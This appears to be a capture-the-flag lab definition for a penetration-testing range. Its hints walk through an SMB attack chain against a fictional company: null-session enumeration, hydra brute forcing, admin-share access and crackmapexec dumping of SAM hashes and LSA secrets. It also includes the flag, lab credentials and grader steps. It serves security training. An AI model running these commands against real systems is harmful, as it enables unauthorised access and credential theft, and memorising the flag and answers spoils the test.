name: SMB Full Credential Attack
description: Complete your FinanceCorp SMB credential assessment by executing the full attack chain from enumeration to access.
difficulty: intermediate
category: credential-attacks
duration_minutes: 120
objectives:
  - complete smb attack chain
  - Understand Windows penetration testing techniques
  - Capture the flag

scenario: |
  You're completing the SMB credential testing phase of your FinanceCorp penetration 
  test. James Mitchell has requested a comprehensive demonstration of the complete 
  attack chain: from initial enumeration through credential discovery to successful 
  authentication.
  
  This final SMB credential exercise will combine all techniques: enumeration, 
  username discovery, password brute forcing, and successful authentication. 
  FinanceCorp needs to see the full attack chain to understand the security risks 
  and prioritize remediation efforts.
  
  Your objective: Execute the complete SMB credential attack chain against FinanceCorp's 
  infrastructure. From enumeration to successful authentication, demonstrate how an 
  attacker could gain unauthorized access through weak credentials.

flag: "OCR{smb_full_4tt4ck}"

hints:
  - text: |
      **Complete SMB credential attack chain** demonstrates the full lifecycle of a Windows penetration test from reconnaissance to exploitation. This combines all SMB techniques into a systematic attack.

      **Full attack chain phases:**
      1. **Share enumeration**: Discover available SMB shares
      2. **Anonymous access**: Test unauthenticated access
      3. **Null session enumeration**: Gather users, groups, shares
      4. **Username harvesting**: Extract valid account names
      5. **Credential testing**: Brute force/spray passwords
      6. **Authentication**: Gain authorized access
      7. **Post-exploitation**: Access files, escalate privileges

      This end-to-end demonstration shows how all SMB attack vectors connect in a real penetration test.
    unlock_after_minutes: 0

  - text: |
      **Phase 1-3: Reconnaissance and enumeration**

      **Step 1: Share discovery**
      ```bash
      smbclient -L //<target> -N        # Anonymous share listing
      nmap --script smb-enum-shares <target>
      ```

      **Step 2: Anonymous access testing**
      ```bash
      smbclient //<target>/Public -N    # Test public shares
      smbclient //<target>/IPC$ -N      # Test IPC$
      ```

      **Step 3: Null session enumeration**
      ```bash
      rpcclient -U "" -N <target>       # Connect via null session
      enum4linux -a <target>            # Comprehensive enumeration
      ```

      **Information to gather:**
      - Available shares (public and hidden)
      - User accounts and RIDs
      - Domain/workgroup information
      - Password policies
      - Group memberships
      - OS version and build

      This reconnaissance phase provides targets for credential attacks.
    unlock_after_minutes: 5

  - text: |
      **Phase 4-5: Username harvesting and credential testing**

      **Step 4: Extract usernames**
      ```bash
      # Using rpcclient
      rpcclient -U "" -N <target> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt

      # Using enum4linux
      enum4linux -U <target> | grep "user:" | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
      ```

      **Step 5: Create attack wordlists**
      ```bash
      # Small targeted password list
      cat > passwords.txt <<EOF
      password
      admin
      Password123
      Admin123
      $(date +%B%Y)!
      EOF

      # Or use system wordlists
      cp /usr/share/wordlists/rockyou.txt passwords.txt
      ```

      **Step 6: Credential attacks**
      ```bash
      # Password spraying (safest)
      hydra -L users.txt -p Password123 smb://<target>

      # Brute force (higher risk)
      hydra -L users.txt -P passwords.txt smb://<target> -t 2

      # Username=password testing
      hydra -L users.txt -e nsr smb://<target>
      ```

      Successful credential discovery provides authentication for the next phase.
    unlock_after_minutes: 10

  - text: |
      **Phase 6-7: Authentication and exploitation**

      **Step 7: Verify credentials**
      ```bash
      smbclient -L //<target> -U username%password
      crackmapexec smb <target> -u username -p password
      ```

      **Step 8: Access shares**
      ```bash
      smbclient //<target>/C$ -U username%password        # Admin share
      smbclient //<target>/ADMIN$ -U username%password    # Admin share
      smbclient //<target>/ShareName -U username%password # Custom shares
      ```

      **Step 9: File enumeration and retrieval**
      ```bash
      smb: \> ls
      smb: \> cd Users
      smb: \> get flag.txt
      smb: \> mget *.txt
      ```

      **Step 10: Post-exploitation enumeration**
      ```bash
      crackmapexec smb <target> -u user -p pass --shares        # List all accessible shares
      crackmapexec smb <target> -u user -p pass --sam           # Dump SAM hashes
      crackmapexec smb <target> -u user -p pass --lsa           # Dump LSA secrets
      crackmapexec smb <target> -u user -p pass -M spider_plus  # Recursively list files
      ```

      This phase demonstrates the impact of compromised credentials.
    unlock_after_minutes: 15

  - text: |
      **Complete attack chain execution:**

      ```bash
      # Phase 1: Share enumeration
      smbclient -L //<target> -N

      # Phase 2: Null session enumeration
      enum4linux -a <target>

      # Phase 3: Extract usernames
      rpcclient -U "" -N <target> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt

      # Phase 4: Create password list
      echo -e "password\nadmin\nPassword123" > passwords.txt

      # Phase 5: Credential brute force
      hydra -L users.txt -P passwords.txt smb://<target> -t 2 -f

      # Phase 6: Verify and use credentials
      smbclient -L //<target> -U admin%admin

      # Phase 7: Access shares and retrieve data
      smbclient //<target>/C$ -U admin%admin -c 'ls; get flag.txt'
      ```

      This streamlined workflow demonstrates the complete attack from start to finish.
    unlock_after_minutes: 20

  - text: |
      Complete SMB credential attack output:

      ```bash
      # Phase 1: Enumeration
      $ enum4linux -a <target_ip>
      [+] Got domain/workgroup name: FINANCECORP
      [+] Enumerating users
      user:[Administrator] rid:[0x1f4]
      user:[admin] rid:[0x3e8]
      user:[backup] rid:[0x3e9]

      # Phase 2: Extract usernames
      $ rpcclient -U "" -N <target_ip> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt
      $ cat users.txt
      Administrator
      admin
      backup

      # Phase 3: Credential attack
      $ hydra -L users.txt -P passwords.txt smb://<target_ip>
      [445][smb] host: <target_ip>   login: admin   password: admin
      1 of 1 target completed, 1 valid password found

      # Phase 4: Verify access
      $ smbclient -L //<target_ip> -U admin%admin
      Sharename       Type      Comment
      ---------       ----      -------
      C$              Disk      Default share
      ADMIN$          Disk      Remote Admin
      IPC$            IPC       Remote IPC

      # Phase 5: Access and retrieve
      $ smbclient //<target_ip>/C$ -U admin%admin
      smb: \> cd Users\Administrator\Desktop
      smb: \> ls
      flag.txt
      smb: \> get flag.txt
      getting file \Users\Administrator\Desktop\flag.txt

      $ cat flag.txt
      OCR{...}
      ```

      **Complete attack chain documentation:**
      1. **Enumeration results**: Shares, users, domain info
      2. **Credentials discovered**: All valid username/password pairs
      3. **Access level**: Admin, user, or limited
      4. **Files accessed**: Sensitive data retrieved
      5. **Timeline**: Total time from enumeration to exploitation
      6. **Remediation**: Recommendations to fix identified issues

      The flag is accessible through executing the complete SMB attack chain: enumerate users, brute force credentials, authenticate, and access protected shares.
    unlock_after_minutes: 25
workbook: "wiki/range/winpt/CH03_SMB_Credential_Attacks/05_Full_Credential_Attack/"

credentials:
  - username: "admin"
    password: "admin"
    role: "smb-admin"
    description: "SMB admin user"

test:
  steps:
    - name: "Verify SMB port 445 is open"
      command: "nmap -Pn -p 445 {target.target} | grep '445/tcp'"
      expect: "open"

    - name: "Authenticate to SMB with discovered credentials"
      command: "smbclient //{target.target}/flag -U '{cred.smb-admin.user}%{cred.smb-admin.pass}' -c 'ls' 2>&1"
      expect: "flag.txt"

    - name: "Retrieve flag from SMB flag share"
      command: "smbclient //{target.target}/flag -U '{cred.smb-admin.user}%{cred.smb-admin.pass}' -c 'get flag.txt -' 2>/dev/null"
      expect: "OCR{"
